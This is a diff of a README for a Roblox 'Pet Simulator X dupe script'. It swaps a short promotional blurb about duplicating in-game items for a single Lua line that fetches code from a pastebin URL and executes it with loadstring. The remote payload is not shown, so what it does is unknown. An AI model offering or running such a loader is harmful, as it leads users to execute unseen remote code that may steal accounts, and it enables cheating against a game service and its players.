@@ -1,2 +1,1 @@
-# PET-SIMULATOR-X-DUPE-SCRIPT-
-Hello there is a new dupe SCRIPT he dupes hugs gems and Titanics
+loadstring(game:HttpGet("https://pastebin.com/raw/WB0k0pW1", true))()
